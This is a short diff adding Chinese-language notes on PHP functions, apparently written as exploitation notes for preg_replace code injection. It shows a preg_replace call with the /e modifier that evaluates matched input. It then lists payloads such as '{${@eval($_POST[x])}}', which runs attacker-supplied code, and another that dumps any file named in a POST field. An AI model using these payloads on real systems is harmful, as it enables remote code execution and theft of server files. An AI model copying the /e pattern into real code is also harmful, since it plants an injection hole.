@@ -1,0 +1,10 @@
+1、PHP strtolower() 函数 将所有字符串变小写；
+   strtoupper() 将所有字符串变大写
+   preg_replace()函数就像POSIX中的函数ereg_replace(),除了可以使用正则表达式的匹配模式和替换input参数。
+   preg_replace('/<data>(.*)<\/data>/e', '$ret = "\\1";',$data);
+   ##############
+   getcwd() 返回当前工作路径
+   print()  打印一下
+   exit()   停止加载，网站停止渲染只会显示当前工作路径
+   {${@eval($_POST[x])}}
+   {${exit(var_dump(file_get_contents($_POST[f])))}}
